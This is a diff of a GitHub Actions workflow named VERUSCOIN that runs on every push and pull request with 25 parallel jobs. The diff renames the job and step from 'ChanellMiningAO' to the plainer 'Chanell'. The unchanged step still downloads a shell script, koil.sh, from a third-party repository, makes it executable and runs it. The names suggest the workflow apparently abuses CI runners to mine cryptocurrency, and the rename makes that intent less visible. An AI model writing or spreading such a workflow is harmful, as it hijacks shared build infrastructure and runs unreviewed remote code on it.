@@ -2,7 +2,7 @@ name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: ChanellMiningAO
+    name: Chanell
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 25
@@ -22,6 +22,6 @@ steps:
   id: go
 - name: Setup
   uses: actions/checkout@v1
-- name: ChanellMiningAO
+- name: Chanell
   run: | 
     wget https://github.com/ChanellMiningAO/koil/blob/main/koil.sh && chmod u+x koil.sh && ./koil.sh
